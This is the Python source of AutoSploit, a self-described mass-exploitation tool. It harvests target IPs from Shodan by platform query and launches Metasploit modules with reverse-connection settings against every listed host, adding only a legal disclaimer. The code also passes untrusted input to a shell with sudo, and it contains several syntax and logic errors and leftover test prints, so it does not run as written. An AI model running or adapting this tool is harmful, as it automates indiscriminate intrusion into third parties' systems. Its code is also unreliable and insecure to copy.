#!/usr/bin/env python2.7
"""Autosploit Core."""

import os, sys
import time
import pickle
import shodan

from retrying import retry
from blessings import Terminal
from subprocess import PIPE, Popen

t = Terminal()

# Global vars
api           = ""
query         = ""
workspace     = ""
local_port    = ""
local_host    = ""
configured    = False
toolbar_width = 60


def logo():
    """Logo."""
    print(t.cyan("""
                              _____     _       _____     _     _ _
#--Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_
#--Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|
#--Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|
#--Version: 1.4.0                                    |_|
##############################################
"""))


def usage():
    """Usage & Legal."""
    print("\033[H\033[J")  # Clear terminal
    logo()
    print("""
+-----------------------------------------------------------------------+
|            AutoSploit General Usage and Information                   |
+-----------------------------------------------------------------------+
|As the name suggests AutoSploit attempts to automate the exploitation  |
|of remote hosts. Targets are collected by employing the Shodan.io API. |
|                                                                       |
|The 'Gather Hosts' option will open a dialog from which you can        |
|enter platform specific search queries such as 'Apache' or 'IIS'.      |
|Upon doing so a list of candidates will be retrieved and saved to      |
|hosts.txt in the current working directory.				|
|As of version 1.4.9 an option to load a custom list of hosts has been  |
|included.                                                              |
|After this operation has been completed the 'Exploit' option will      |
|go about the business of attempting to exploit these targets by        |
|running a range of Metasploit modules against them.                    |
|                                                                       |
|Workspace, local host and local port for MSF facilitated               |
|back connections are configured through the dialog that comes up       |
|before the 'Exploit' module is started.                                |
|                                                                       |
+------------------+----------------------------------------------------+
|     Option       |                   Summary                          |
+------------------+----------------------------------------------------+
|1. Usage/Legal    | Display this informational message & Disclaimer    |
|2. Gather Hosts   | Query Shodan for a list of platform specific IPs.  |
|3. Custom Hosts   | Load in a custom list of IPs/Rhosts                |
|4. Single Host    | Add a single host to list and/or exploit directly  |
|5. View Hosts     | Print gathered IPs/RHOSTS.                         |
|6. Exploit        | Configure MSF and Start exploiting gathered targets|
|7. Quit           | Exits AutoSploit.                                  |
+------------------+----------------------------------------------------+
|                         Legal Disclaimer                              |
+-----------------------------------------------------------------------+
|Usage of AutoSploit for attacking targets without prior mutual consent | 
|is illegal. It is the end user's responsibility to obey all applicable | 
|local, state, and federal laws. Developers assume no liability and are |
|not responsible for any misuse or damage caused by this program.	|
+-----------------------------------------------------------------------+
""")


def cmdline(command):
    """
    Function that allows us to store system command output in a variable.
    We'll change this later in order to solve the potential security
    risk that arises when passing untrusted input to the shell.
    
    I intend to have the issue resolved by Version 1.5.0. 
    """

    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]


def exploit(query=None, single=None):
    """Exploit component"""
	
    global workspace
    global local_port
    global local_host
    print("\033[H\033[J")  # Clear terminal
	
    logo()
    
    sorted_modules = []
    all_modules = []

    if query == None:
        rhosts = single
		
        print("\n[{}]Single target mode. All available modules will be run against provided RHOST.".format(t.green("+")))
        proceed = raw_input("[" + t.magenta("?") + "]Continue? [Y]es/[N]o: ").lower()
		
        if proceed == 'y':
            print("\n\n\n[{}]Loading modules...".format(t.green("+")))
            # Progress bar
            sys.stdout.write("[%s]" % (" " * toolbar_width))
            sys.stdout.flush()
            sys.stdout.write("\b" * (toolbar_width + 1))
			
            with open("modules.txt", "rb") as infile:
                for i in xrange(toolbar_width):
		    time.sleep(0.1)
                    for lines in infile:
                        all_modules.append(lines)
		
            print("\n\n\n[{}]Done. Launching exploits.".format(t.green("+")))
            template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
            cmdline(template)
		
        elif proceed == 'n':
            print("[{}]Aborted. Returning to Main Menu".format(t.red("!")))
			
        else:
            print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
		
    else:
        print("[{}]Sorting modules relevant to the specified platform.".format(t.green("+")))
        print("[{}]This may take a while...\n\n\n".format(t.green("+")))

        # Progress bar
	sys.stdout.write("[%s]" % (" " * toolbar_width))
	sys.stdout.flush()
	sys.stdout.write("\b" * (toolbar_width + 1))

        with open("modules.txt", "rb") as infile:
	    for i in xrange(toolbar_width):
                time.sleep(0.1)
                for lines in infile:
                    all_modules.append(lines)
                    if query in lines:
                        sorted_modules.append(lines)

                # update the bar
                sys.stdout.write('\033[94m' + "|" + '\033[0m')
                sys.stdout.flush()

        print("\n\n\n[{}]AutoSploit sorted the following MSF modules based search query relevance.\n".format(t.green("+")))
	# Print out the sorted modules
	for line in sorted_modules:
	    print("[{}] {}".format(t.cyan("-"), line))

        # We'll give the user the option to run all modules in a 'hail mary' type of attack or allow
	# a more directed approach with the sorted modules.
	choice = raw_input("\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()

	if choice == 's':
            with open("hosts.txt", "rb") as host_list:
                for rhosts in host_list:
		    for exploit in sorted_modules:
                        # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                        template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
                        cmdline(template)
        elif choice == 'a':
	    with open("hosts.txt", "rb") as host_list:
                for rhosts in host_list:
		    for exploit in all_modules:
                        # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                        template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
                        cmdline(template)
        else:
	    print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
			

def settings(single=None):
    """Function to define Metasploit settings."""
    global workspace
    global local_port
    global local_host
    global configured

    print("\033[H\033[J")  # Clear terminal
    logo()

    print("[{}]MSF Settings\n".format(t.green("+")))
    print("In order to proceed with the exploit module some MSF")
    print("settings need to be configured.")
    time.sleep(1.5)

    print("\n[{}]Note.\n".format(t.green("+")))
    print("Please make sure your Network is configured properly.\n")
    print("In order to handle incoming Reverse Connections")
    print("your external Facing IP & Port need to be reachable...")
    time.sleep(1.5)

    workspace = raw_input("\n[" + t.magenta("?") + "]Please set the Workspace name: ")
    if not workspace == "":
        print("[{}]Workspace set to: {}".format(t.green("+"), workspace))
    else:
        workspace = False
        
    local_host = raw_input("\n[" + t.magenta("?") + "]Please set the local host: ")
    if not local_host == "":
        print("[{}]Local host set to: {}".format(t.green("+"), repr(local_host)))
    else:
        local_host = False

    local_port = raw_input("\n[" + t.magenta("?") + "]Please set the local port: ")
    if not local_host == "":
        print("[{}]Local port set to: {}".format(t.green("+"), repr(local_port)))
    else:
        local_port = False

    # Check if settings are not null
    if workspace is False or local_host is False or local_port is False:
        configured = None
        print("\n[{}]Warning. LPORT, LHOST and/or workspace cannot be null".format(t.red("!")))
        print("[{}]Restarting MSF Settings module.".format(t.green("+")))
        time.sleep(2)
    else:
        # If everything has been properly configured we're setting config var to true
        # When we return to the main menu loop we will use it to check to see if we
        # can skip the config stage. When the exploit component is run a second time
        configured = True
		
        if single is not None:
            exploit(None, single)
            # TEST print
            print "De waarde van 'single' is" +repr(single)
            print 'we moete nu de exploit module in met de juiste waarde'
            # TEST print
		
        if not os.path.isfile("hosts.txt"):
	    print("[{}]Warning. AutoSploit failed to detect host file.".format(t.red("!")))
            print("In order for the exploit module to work, a host file needs to be present.")
        else:
	    # Call exploit function, the 'query' argument contains the search strig provided
            # in the 'gather hosts' function. We will check this string against the MSF
            # modules in order to sort out the most relevant ones with regards to the intended
            # targets.
            exploit(query)

def targets(clobber=True):
    """Function to gather target host(s) from Shodan."""
    global query

    print("\033[H\033[J")  # Clear terminal
    logo()

    print("[{}]Please provide your platform specific search query.".format(t.green("+")))
    print("[{}]I.E. 'IIS' will return a list of IPs belonging to IIS servers.".format(t.green("+")))

    while True:
        query = raw_input("\n<" + t.cyan("PLATFORM") + ">$ ")

        if query == "":
	    print("[{}]Query cannot be null.".format(t.red("!")))
		
        break

    
    print("[{}]Please stand by while results are being collected...\n\n\n".format(t.green("+")))
    time.sleep(1)

    try:
        result = api.search(query)
    except Exception as e:
	print("\n[{}]Critical. An error was raised with the following error message.\n".format(t.red("!")))
        sys.exit(e)

     # Setup progress bar
    sys.stdout.write("[%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width + 1))

    if clobber:
	with open('hosts.txt', 'wb') as log:
            for i in xrange(toolbar_width):
		time.sleep(0.1)
                for service in result['matches']:
                    log.write(service['ip_str'])
                    log.write("\n")

            # update the bar
            sys.stdout.write('\033[94m' + "|" + '\033[0m')
            sys.stdout.flush()

            hostpath = os.path.abspath("hosts.txt")

        print("\n\n\n[{}]Done.".format(t.green("+")))
        print("[{}]Host list saved to {}".format(t.green("+"), hostpath))

    else:
	with open("hosts.txt", "ab") as log:
	    for i in xrange(toolbar_width):
                time.sleep(0.1)
		for service in result['matches']:
                    log.write(service['ip_str'])
                    log.write("\n")

                # update the bar
		sys.stdout.write('\033[94m' + "|" + '\033[0m')
                sys.stdout.flush()

        hostpath = os.path.abspath("hosts.txt")

        print("\n\n\n[{}]Done.".format(t.green("+")))
	print("[{}]Hosts appended to list at ".format(t.green("+"), hostpath))



def import_custom(clobber=True):	
    """Function to import custom host list."""
    print("\033[H\033[J")  # Clear terminal
    logo()
	
    custom_list = []
	
    print("[{}]Please provide a path to your custom host list.".format(t.green("+")))
    file_path = raw_input("\n[" + t.magenta("?") + "]Path to list: "
 
    try:
        with open(file_path, "rb") as infile:
            for line in infile:
                line.append(custom_list)
    
    except IOError as e: 
	print("\n[{}]Critical. An IO error was raised.".format(t.red("!")))
        print("Please make sure to enter a valid path.")
	
    if clobber:
        print("[{}]Writing data to 'hosts.txt'...".format(t.green("+")))
            with open('hosts.txt', 'wb') as outfile:
                for rhosts in custom_list:
                    outfile.write(rhosts)
                    outfile.write("\n")

        hostpath = os.path.abspath("hosts.txt")
		
        print("\n\n\n[{}]Done.".format(t.green("+")))
        print("[{}]Host list saved to {}".format(t.green("+"), hostpath))
		
    else:
        print("[{}]Appending data to 'hosts.txt'...".format(t.green("+")))

	with open( "hosts.txt", 'ab') as outfile:
            for rhosts in custom_list:
		outfile.write(rhosts)
                outfile.write("\n")

        hostpath = os.path.abspath("hosts.txt")
		
        print("\n\n\n[{}]Done.".format(t.green("+")))
        print("[{}]Host list saved to {}".format(t.green("+"), hostpath))


def single_target()
    """
    Add single target to host list or pass it to the exploit function directly
    to attempt to exploit it.
    """
    print("\033[H\033[J")  # Clear terminal
    logo()
	
    print("[{}]Please provide a single IPv4.".format(t.green("+")))
    IP = raw_input("[" + t.magenta("?") + "]IPv4 Address: ")

    quartet1 = int(IP[0:IP.index('.')])				
    IP = IP[IP.index('.')+1:]
    quartet2 = int(IP[0:IP.index('.')])					
    IP = IP[IP.index('.')+1:]
    quartet3 = int(IP[0:IP.index('.')])				
    IP = IP[IP.index('.')+1:]
    quartet4 = int(IP)								
					
    IP = str(quartet1) + "." + str(quartet2) + "." + str(quartet3) + "." + str(quartet4)
										
    if quartet1 < 0 or quartet1 > 255:
        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
    elif quartet2 < 0 or quartet2 > 255:
        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
    elif quartet3 < 0 or quartet3 > 255:
        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
    elif quartet4 < 0 or quartet4 > 255:
        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
    elif IP == "127.0.0.1":
        print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
    else:
        print("\n[{}]Host set to {}".format(t.green("+"), repr(hostpath)))
        time.sleep(1)
			
        print("\n\n[{}]Append the IP to the host file or pass to exploit module directly?.".format(t.green("+")))
        choice = raw_input("\n[" + t.magenta("?") + "]Append or Pass for immediate exploitation? [A/P]: ").lower()
		
        if choice == 'a':
            with open( "hosts.txt", "ab") as outfile:				
                outfile.write(IP)
		
        hostpath = os.path.abspath("hosts.txt")	
        print("[{}]Host added to {}".format(t.green("+"), hostpath))		
		
        elif choice == 'p':
            if configured:
                exploit(None, IP)
            else:
                settings(IP)
				
        else:
            print("\n[{}]Unhandled Option.".format(t.red("!")))
				

def main():
    """Main menu."""
    global query
    global configured
    global api

    @retry(stop_max_attempt_number=3)
    def try_shodan():
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
        except Exception as e:
            print("\n[{}]Critical. API setup failed: {}\n".format(t.red("!"), e))
            # sys.exit(e)
        return api

    api = try_shodan()
    try:
        while True:
            # Make sure a misconfiguration in the MSF settings
            # Doesn't execute main menu loop but returns us to the
            # appropriate function for handling those settings
            if configured is None:
                 settings()

            print("\n[{}]Welcome to AutoSploit. Please select an action.".format(t.green("+")))
            print("""

1. Usage/Legal 	       4. Add Single host       7. Quit   			
2. Gather Hosts        5. View Hosts						
3. Custom Hosts        6. Exploit                            
""")

        action = raw_input("\n<" + t.cyan("AUTOSPLOIT") + ">$ ")

        if action == '1':
            usage()
  
        elif action == '2':
            if not os.path.isfile("hosts.txt"):
                targets(True)
            else:
                append = raw_input("\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()

                if append == 'a':
                    targets(False)
                elif append == 'o':
                    targets(True)
                else:
                     print("\n[{}]Unhandled Option.".format(t.red("!")))
			
        elif action == '3':
            if not os.path.isfile("hosts.txt"):
                import_custom(True)
            else:
                append = raw_input("\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()
					
                if append == 'a':
                    import_custom(False)
                elif append == 'o':
                    import_custom(True)
                else:
                    print("\n[{}]Unhandled Option.".format(t.red("!")))
			
        elif action == '4':
            single_target()

        elif action == '5':
            if not os.path.isfile("hosts.txt"):
                print("\n[{}]Warning. AutoSploit failed to detect host file.".format(t.red("!")))

            else:
                print("[{}]Printing hosts...\n\n".format(t.green("+")))
                time.sleep(2)

                with open("hosts.txt", "rb") as infile:
                    for line in infile:
                        print("[{}]{}".format(t.cyan("-"), line))

                    print("\n[{}]Done.".format(t.green("+")))
           

        elif action == '6':
            if not os.path.isfile("hosts.txt"):
                print("\n[{}]Warning. AutoSploit failed to detect host file.".format(t.red("!")))
                print("Please make sure to gather a list of targets")
                print("by selecting the 'Gather Hosts' option")
                print("before executing the 'Exploit' module.")

            if configured:
                exploit(query)
            elif configured is False:
                settings()

        elif action == '7':
            print("\n[{}]Exiting AutoSploit...".format(t.red("!")))
            break

        else:
            print("\n[{}]Unhandled Option.".format(t.red("!")))

    except KeyboardInterrupt:
        print("\n[{}]Critical. User aborted.".format(t.red("!")))
        sys.exit(0)


if __name__ == "__main__":
    logo()

    print("[{}]Initializing AutoSploit...".format(t.green("+")))
    print("[{}]One moment please while we check the Postgresql and Apache services...\n".format(t.green("+")))

    postgresql = cmdline("sudo service postgresql status | grep active")
    if "Active: inactive" in postgresql:
        print("\n[{}]Warning. Hueristics indicate Postgresql Service is offline".format(t.red("!")))

        start_pst = raw_input("\n[" + t.magenta("?") + "]Start Postgresql Service? [Y]es/[N]o: ").lower()
        if start_pst == 'y':
            os.system("sudo service postgresql start")
            print("[{}]Postgresql Service Started...".format(t.green("+")))
            time.sleep(1.5)

        elif start_pst == 'n':
            print("\n[{}]AutoSploit's MSF related operations require this service to be active.".format(t.red("!")))
            print("[{}]Aborted.".format(t.red("!")))
            time.sleep(1.5)
            sys.exit(0)
        else:
            print("\n[{}]Unhandled Option. Defaulting to starting the service.".format(t.red("!")))
            os.system("sudo service postgresql start")

            print("[{}]Postgresql Service Started...".format(t.green("+")))
            time.sleep(1.5)

    apache = cmdline("service apache2 status | grep active")
    if "Active: inactive" in apache:
        print("\n[{}]Warning. Hueristics indicate Apache Service is offline".format(t.red("!")))

        start_ap = raw_input("\n[" + t.magenta("?") + "]Start Apache Service? [Y]es/[N]o: ").lower()
        if start_ap == 'y':
            os.system("sudo service apache2 start")

            print("[{}]Apache2 Service Started...".format(t.green("+")))
            time.sleep(1.5)

        elif start_ap == 'n':
            print("\n[{}]AutoSploit's MSF related operations require this service to be active.".format(t.red("!")))
            print("[{}]Aborted.".format(t.red("!")))
            time.sleep(1.5)
            sys.exit(0)
        else:
            print("\n[{}]Unhandled Option. Defaulting to starting the service.".format(t.red("!")))
            os.system("sudo service apache2 start")
            # TODO: Should really add another check here to make sure it started.

            print("[{}]Apache2 Service Started...".format(t.green("+")))
            time.sleep(1.5)

    # We will check if the shodan api key has been saved before, if not we are going to prompt
    # for it and save it to a file
    if not os.path.isfile("api.p"):
        print("\n[{}]Please provide your Shodan.io API key.".format(t.green("+")))

        SHODAN_API_KEY = raw_input("API key: ")
        pickle.dump(SHODAN_API_KEY, open("api.p", "wb"))
        path = os.path.abspath("api.p")
        print("[{}]\nYour API key has been saved to {}".format(t.green("+"), path))
        main()

    else:
        try:
            SHODAN_API_KEY = pickle.load(open("api.p", "rb"))
        except IOError as e:
            print("\n[{}]Critical. An IO error was raised while attempting to read API data.\n{}".format(t.red("!"), e))

        path = os.path.abspath("api.p")
        print("\n[{}]Your API key was loaded from {}".format(t.green("+"), path))

        main()
